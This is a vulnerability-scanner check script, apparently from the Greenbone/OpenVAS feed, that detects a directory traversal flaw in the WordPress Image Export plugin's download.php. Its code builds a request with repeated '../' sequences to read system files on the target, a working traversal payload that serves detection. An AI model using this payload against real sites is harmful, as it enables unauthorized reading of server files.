CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807625" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-04-01 13:19:31 +0530 (Fri, 01 Apr 2016)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "WordPress Image Export Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress Image
  Export plugin and is prone to directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not" );
	script_tag( name: "insight", value: "The flaw exists due to an improper sanitization
  of input to 'file' parameter in 'download.php' file." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers
  to read arbitrary files." );
	script_tag( name: "affected", value: "WordPress Image Export Plugin 1.1.0. and prior" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/39584/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/wp-content/plugins/image-export-master/download.php?file=" + crap( data: "../", length: 3 * 15 ) + files[file];
	if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: file )){
		report = http_report_vuln_url( port: http_port, url: url );
		security_message( port: http_port, data: report );
		exit( 0 );
	}
}

